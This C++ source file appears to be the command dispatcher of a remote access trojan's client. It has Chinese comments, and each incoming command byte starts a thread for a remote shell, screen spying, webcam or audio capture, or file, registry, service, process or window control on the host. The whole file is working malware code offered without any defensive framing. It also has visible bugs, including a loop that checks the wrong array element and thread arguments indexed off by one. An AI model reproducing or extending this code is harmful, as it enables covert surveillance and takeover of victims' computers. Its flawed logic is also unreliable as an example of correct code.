// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Common.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(IOCPClient* ClientObject):CManager(ClientObject)
{
	m_ulThreadCount = 0;
}

CKernelManager::~CKernelManager()
{
	printf("~CKernelManager begin\n");
	int i = 0;
	for (i=0;i<0x1000;++i)
	{
		if (m_hThread->h!=0)
		{
			CloseHandle(m_hThread[i].h);
			m_hThread[i].h = NULL;
			m_hThread[i].run = FALSE;
			while (m_hThread[i].p)
				Sleep(50);
		}
	}
	m_ulThreadCount = 0;
	printf("~CKernelManager end\n");
}

VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	IOCPClient *pNew = szBuffer[0] == COMMAND_BYE ? NULL : new IOCPClient(true);
	m_hThread[m_ulThreadCount].p = pNew;

	switch(szBuffer[0])
	{
	case COMMAND_TALK:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopTalkManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SHELL:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopShellManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SYSTEM:       //远程进程管理
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, 
				(LPTHREAD_START_ROUTINE)LoopProcessManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_WSLIST:       //远程窗口管理
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopWindowManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_BYE:
		{
			BYTE	bToken = COMMAND_BYE;// 被控端退出
			m_ClientObject->OnServerSending((char*)&bToken, 1);
			m_bIsDead = 1;
			OutputDebugStringA("======> Client exit \n");
			m_hThread[m_ulThreadCount].p = NULL;
			delete pNew;
			pNew = NULL;
			break;
		}

	case SERVER_EXIT:
		{
			BYTE	bToken = SERVER_EXIT;// 主控端退出  
			m_ClientObject->OnServerSending((char*)&bToken, 1);
			m_bIsDead = 2;
			OutputDebugStringA("======> Server exit \n");
			m_hThread[m_ulThreadCount].p = NULL;
			delete pNew;
			pNew = NULL;
			break;
		}

	case COMMAND_SCREEN_SPY:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopScreenManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_LIST_DRIVE :
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopFileManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_WEBCAM:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopVideoManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_AUDIO:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopAudioManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_REGEDIT:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopRegisterManager,
				&m_hThread[m_ulThreadCount], 0, NULL);;
			break;
		}

	case COMMAND_SERVICES:
		{
			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
				(LPTHREAD_START_ROUTINE)LoopServicesManager,
				&m_hThread[m_ulThreadCount], 0, NULL);
			break;
		}

	default:
		{
			OutputDebugStringA("======> Error operator\n");
			m_hThread[m_ulThreadCount].p = NULL;
			delete pNew;
			pNew = NULL;
			break;
		}
	}
}
